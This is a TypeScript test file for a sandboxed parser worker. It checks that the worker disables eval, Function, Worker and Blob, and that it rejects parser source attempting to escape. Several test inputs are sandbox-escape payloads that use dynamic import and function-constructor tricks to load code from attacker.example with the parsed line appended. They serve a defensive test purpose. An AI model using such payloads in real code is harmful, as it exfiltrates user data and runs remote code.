// @vitest-environment node
import vm from "node:vm";
import { describe, expect, it } from "vitest";

import { getWorkerBootstrapSource } from "./sandboxed-parser-worker";

function runWorkerMessages(messages: unknown[]) {
  const context = vm.createContext({
    postMessage: (message: unknown) => messages.push(message),
    URL: {
      createObjectURL: () => "blob:test",
      revokeObjectURL: () => undefined,
    },
  });
  Object.assign(context, { self: context });
  vm.runInContext(getWorkerBootstrapSource(), context);
  return context as { onmessage: (event: { data: unknown }) => void };
}

describe("sandboxed parser worker bootstrap", () => {
  it("disables child worker and object URL escape hatches", () => {
    const source = getWorkerBootstrapSource();

    expect(source).toContain('disableGlobal("Worker")');
    expect(source).toContain('disableGlobal("SharedWorker")');
    expect(source).toContain('disableGlobal("Blob")');
    expect(source).toContain('disableGlobal("RTCPeerConnection")');
    expect(source).toContain('disableGlobal("RTCDataChannel")');
    expect(source).toContain('"createObjectURL"');
    expect(source).toContain('"revokeObjectURL"');
  });

  it("disables eval and function-constructor escape hatches", () => {
    const source = getWorkerBootstrapSource();

    expect(source).toContain('disableGlobal("eval")');
    expect(source).toContain('disableGlobal("Function")');
    expect(source).toContain("disableFunctionConstructor(NativeAsyncFunction)");
    expect(source).toContain("disableFunctionConstructor(NativeGeneratorFunction)");
    expect(source).toContain("disableFunctionConstructor(NativeAsyncGeneratorFunction)");
  });

  it("evaluates parser source in strict mode", () => {
    expect(getWorkerBootstrapSource()).toContain('\\"use strict\\";\\n{\\n" + msg.source');
  });

  it("does not include the unused parse_batch protocol branch", () => {
    expect(getWorkerBootstrapSource()).not.toContain("parse_batch");
  });

  it("keeps stateful parser factories behind per-session parser ids", () => {
    const source = getWorkerBootstrapSource();

    expect(source).toContain("const parserSessions = new Map()");
    expect(source).toContain('msg.type === "reset_parser"');
    expect(source).toContain("msg.parserId && createStdoutParser");
    expect(source).not.toContain("fallbackParser = createStdoutParser()");
  });

  it("accepts normal parser source", () => {
    const messages: unknown[] = [];
    const worker = runWorkerMessages(messages);

    worker.onmessage({
      data: {
        type: "init",
        source: `exports.parseStdoutLine = (line, ts) => [{ kind: "stdout", ts, text: line }];`,
      },
    });

    expect(messages).toEqual([{ type: "ready", hasStdoutParserFactory: false }]);
  });

  it("rejects parser source with dynamic import before evaluation", () => {
    const messages: unknown[] = [];
    const worker = runWorkerMessages(messages);

    worker.onmessage({
      data: {
        type: "init",
        source: `exports.parseStdoutLine = (line) => import("https://attacker.example/p.js?d=" + encodeURIComponent(line));`,
      },
    });

    expect(messages).toEqual([
      {
        type: "error",
        message: "Parser init failed: Parser source uses forbidden dynamic import",
      },
    ]);
  });

  it("rejects direct Function based dynamic import escapes", () => {
    const messages: unknown[] = [];
    const worker = runWorkerMessages(messages);

    worker.onmessage({
      data: {
        type: "init",
        source: `exports.parseStdoutLine = (line) => { Function("u", "return import(u)")("https://attacker.example/p.js?d=" + encodeURIComponent(line)); return []; };`,
      },
    });

    expect(messages).toEqual([
      {
        type: "error",
        message: "Parser init failed: Parser source uses forbidden eval or Function constructor",
      },
    ]);
  });

  it("rejects async-function constructor escape hatches", () => {
    const messages: unknown[] = [];
    const worker = runWorkerMessages(messages);

    worker.onmessage({
      data: {
        type: "init",
        source: `const AsyncFunction = (async () => {}).constructor; exports.parseStdoutLine = (line) => { AsyncFunction("u", "return im" + "port(u)")("https://attacker.example/p.js?d=" + encodeURIComponent(line)); return []; };`,
      },
    });

    expect(messages).toEqual([
      {
        type: "error",
        message: "Parser init failed: Parser source uses forbidden constructor escape hatch",
      },
    ]);
  });
});
